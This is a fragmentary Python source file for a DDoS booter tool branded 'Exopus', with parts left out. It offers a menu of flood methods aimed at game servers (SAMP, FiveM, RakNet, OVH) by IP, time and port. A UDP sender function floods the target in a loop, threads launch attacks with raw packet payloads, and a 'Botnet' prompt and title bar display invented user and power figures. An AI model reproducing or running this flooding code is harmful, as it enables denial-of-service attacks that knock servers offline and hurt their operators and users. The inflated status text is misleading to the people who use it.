...
methods = """
\x1b[38;5;202m              Orbit's Attack Menu
\x1b[97m  SAMP [IP] [TIME] [PORT] 
\x1b[97m  OVH-SAMP [IP] [TIME] [PORT] 
\x1b[97m  SAMP-DDOS [IP] [TIME] [PORT] 
\x1b[97m  SAMP-FIVEM [IP] [TIME] [PORT] 
\x1b[97m  SAMP-KILL [IP] [TIME] [PORT] 
\x1b[97m  GAME-KILL [IP] [TIME] [PORT] 
\x1b[97m  STUN [IP] [TIME] [PORT] 
\x1b[97m  RAKNET [IP] [TIME] [PORT] 
\x1b[97m  VSE-SAMP [IP] [TIME] [PORT] 
\x1b[97m  XENJU [IP] [TIME] [PORT] 
\x1b[97m  XENJU-UDP [IP] [TIME] [PORT]
\x1b[97m  STDHEX [IP] [TIME] [PORT] 
"""

raw = """
\033[0;36m                              TOOLS BY XinZz. 
\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
...
banner =  """
\x1b[97m                         \x1b[97mBeyond the \x1b[95mgalaxy\x1b[97m and further\r\n
\x1b[97m                             \x1b[97mHigher than \x1b[36musually\r\n
\x1b[97m                             \x1b[96mInfinity\x1b[97m never ends\r\n
\x1b[97m                   Stars don’t \x1b[93mshine\x1b[97m bright without \x1b[1;90mdarkness\r\n
"""
attacked =  """
\033[0;36m Succes Bots Attack To Ip
\033[0;36m Load Bots
...
plan =  """
\033[0;36m		             =====================================      ==========================
\033[0;36m                           ======================	-+-Tools By Exopus Generation  ==========================
\033[0;36m                            =======================================================================        
\033[0;36m                           =============================   =======================================
\033[0;36m                          =====================  =====================================================
\033[0;36m VIP = TRUE
\033[0;36m USERNAME = Exopus                
...
\033[0;36m                              
\033[0;36m =============EXOPUS CREATED THIS DDOS======================"""
...
def sampsender(host, port, timer, payload):
	global atks
	global running
	...
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(samp_request, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;[-] ExopusTools | Api Connected [5] | Backup Server [1] | Online User [1000] | Admin: [Sixninesix] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		sin = input("\033[0;36m{}\033[0;34m@[Botnet]\033[36m--> \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] Exopus Generation Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[\] Exopus Generation Attack..")
					time.sleep(1)
					...
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Exopus Generation Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Exopus Generation Attack...")
					time.sleep(1)
			...
			try:
				if running >= 20000:
					...
					payload = (b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					                    b"\x55\x55\x55\x55\x00\x00\x00\x01") 
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] Exopus Generation Attack.")
					time.sleep(1)
